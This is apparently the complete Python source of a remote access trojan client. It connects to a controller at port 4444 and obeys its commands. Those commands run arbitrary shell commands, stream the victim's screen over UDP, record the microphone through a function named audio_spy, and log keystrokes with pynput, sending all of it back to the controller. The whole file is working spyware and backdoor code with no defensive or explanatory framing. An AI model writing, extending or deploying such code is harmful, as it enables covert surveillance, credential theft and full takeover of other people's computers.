import socket
from threading import Thread
import time
import os
import subprocess
import struct
import PIL
from PIL import ImageGrab
from PIL import Image
import numpy as np
import io
import zlib
import cv2
import pyaudio
import requests
from pynput import keyboard


class CLIENT:
    
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.address = (self.ip, self.port)
        self.client_Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.client_Socket.connect(self.address)
        self.threads_tracker = {}
        self.BUFFER = 4096
        self.IMG_CHUNK_SIZE = 64535
        self.receive_screenshot_trigger = False
        self.audiospy_trigger = False
        self.keyboard_recording_trigger = False
        
    def thread_starter(self, name, func, params: tuple=None, daemon: bool=False):
        if name in self.threads_tracker:
            print('Thread can not be started')
            return False
        
        if params:
            thread_obj = Thread(target=func, name=name, args=params, daemon=daemon)
        else:
            thread_obj = Thread(target=func, name=name, daemon=daemon)
            
        thread_obj.start()

        self.threads_tracker[name] = thread_obj
        
      
    def receiver(self):
        while True:
            data = self.client_Socket.recv(self.BUFFER)
            if not data:
                break
            return data
     
    def sender(self, data: bytes):
         self.client_Socket.send(data)
    
    def data_packer(self, data):
        '''
        Get the size of data packed into 8 bytes
        '''
        return struct.pack('Q', len(data))

    def cmd(self, command):
        try:
            response = subprocess.check_output(command).decode()
        except Exception as e:
            return str(e)
        return response
         
    def take_screenshot(self):
        fps = 30
        frame_delay = 1 / fps
        while self.receive_screenshot_trigger:
            start_time = time.time()
            img = ImageGrab.grab()
            img = img.resize((1280,720), Image.Resampling.LANCZOS)
            _,encoded_img = cv2.imencode('.jpg', np.array(img, dtype=np.uint8), [cv2.IMWRITE_JPEG_QUALITY, 80])
            if _:
                compressed_imdata = zlib.compress(encoded_img.tobytes(), level=6)
                size = self.data_packer(compressed_imdata)
                self.udps.sendto(size, self.address)
                chunk_compressed_imdata_array = [compressed_imdata[i:i + self.IMG_CHUNK_SIZE] for i in range(0, len(compressed_imdata), self.IMG_CHUNK_SIZE)]
                for chuk in chunk_compressed_imdata_array:
                    self.udps.sendto(chuk, self.address)
                elapsed_time = time.time() - start_time
                if elapsed_time < frame_delay:
                    time.sleep(frame_delay - elapsed_time)
            else:
                print('Can\'t Take Screenshot, Retrying')
                continue
        del self.threads_tracker['scrshoot']
    
    def audio_spy(self):
        pa =  pyaudio.PyAudio()
        stream = pa.open(rate=44100, channels=2, format=pyaudio.paInt16, input=True)
        while self.audiospy_trigger:
            try:
                audio_samples = stream.read(num_frames=1024)
                self.udps.sendto(audio_samples, self.address)
            except:
                stream.stop_stream()
                stream.close()
                pa.terminate()
                self.audiospy_trigger = False
                break
        del self.threads_tracker['audio_spy']
    
    def keyboard_record(self):
        def on_press(e):
            if self.keyboard_recording_trigger:
                full_word = ''
                e = str(e)
                if e == 'Key.backspace':
                    full_word += '⌫'
                elif 'Key.shift' in e:
                    full_word += '[SHIFT]'
                elif 'Key.ctrl' in e:
                    full_word += '[CTRL]'
                elif 'Key.tab' in e:
                    full_word += '\t'
                elif 'Key.caps_lock' in e:
                    full_word += '[CAPS]'
                elif 'Key.alt' in e:
                    full_word += '[ALT]'
                elif 'Key.enter' in e:
                    full_word += '\n'
                elif 'Key.left' in e:
                    full_word += '←'
                elif 'Key.right' in e:
                    full_word += '→'
                elif 'Key.up' in e:
                    full_word += '↑'
                elif 'Key.down' in e:
                    full_word += '↓'
                elif 'Key.space' in e:
                    full_word += ' '
                else:
                    full_word += e
                self.client_Socket.send(full_word.encode('utf8'))
            else:
                listener.stop()
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
        
        del self.threads_tracker['keyboard_spy']
            
    def command_handler(self):
        while True:
            data = self.receiver()
            if data == b'GETHOSTNAME':
                self.sender(os.getlogin().encode('utf-8'))
            elif b'CMD_COMMAND' in data:
                command = data.strip(b'CMD_COMMAND_').decode('utf8')
                res = self.cmd(command)
                size_ = self.data_packer(res)
                self.sender(size_)
                self.sender(res.encode())
            elif data == b'SCRSHOOT':
                self.receive_screenshot_trigger = True
                self.thread_starter('scrshoot', self.take_screenshot, params=None, daemon=False)
            elif data == b'STOP_SCRSHOOT':
                self.receive_screenshot_trigger = False
            elif data == b'AUDIO_SPY':
                self.audiospy_trigger = True
                self.thread_starter('audio_spy', self.audio_spy, params=None, daemon=False)
            elif data == b'CLOSE_AUDIO_SPY':
                self.audiospy_trigger = False
            elif data == b'KEY_REC':
                self.keyboard_recording_trigger = True
                self.thread_starter('keyboard_spy', self.keyboard_record, params=None, daemon=False)
            elif data == b'STOP_KEY_REC':
                self.keyboard_recording_trigger = False
                
if __name__ == '__main__':
    client = CLIENT('127.0.0.1', 4444)
    client.command_handler()
    input('')